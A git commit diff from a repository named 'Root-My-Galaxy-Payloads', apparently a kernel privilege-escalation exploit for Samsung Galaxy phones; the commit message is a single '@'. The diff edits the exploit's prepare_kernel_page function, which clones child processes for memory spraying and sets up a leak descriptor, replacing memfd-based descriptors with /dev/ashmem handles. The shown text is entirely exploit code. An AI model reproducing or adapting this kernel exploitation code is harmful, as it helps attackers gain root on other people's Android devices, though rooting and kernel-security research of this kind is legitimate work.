54f505963ae4ddd559ebecea36669308f4bd37ea
sir990928 <sir990928@xxx.com>
2026-08-01 17:44:22 +0800

    @

--- Root-My-Galaxy-Payloads/src/original/util.c
+++ Root-My-Galaxy-Payloads/src/original/util.c
@@ -553,12 +553,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
     prepare_ctx.childs[i] = clone_child();
-    prepare_ctx.memfds[i] = open_memfd(prepare_ctx.childs[i]);
+    prepare_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
   }
 
   for (size_t i = 0; i < spray_ctx.mm_cnt; i++) {
     spray_ctx.childs[i] = clone_child();
-    spray_ctx.memfds[i] = open_memfd(spray_ctx.childs[i]);
+    spray_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
   }
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
@@ -574,11 +574,11 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
-    pre_ctx.memfds[i] = open_memfd(pre_ctx.childs[i]);
+    pre_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
   }
-  memfd_leak = open_memfd(child_leak);
+  memfd_leak = open("/dev/ashmem", O_RDWR);
   for (size_t i = 0; i < post_ctx.mm_cnt; i++) {
-    post_ctx.memfds[i] = open_memfd(post_ctx.childs[i]);
+    post_ctx.memfds[i] = open("/dev/ashmem", O_RDWR);
   }
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
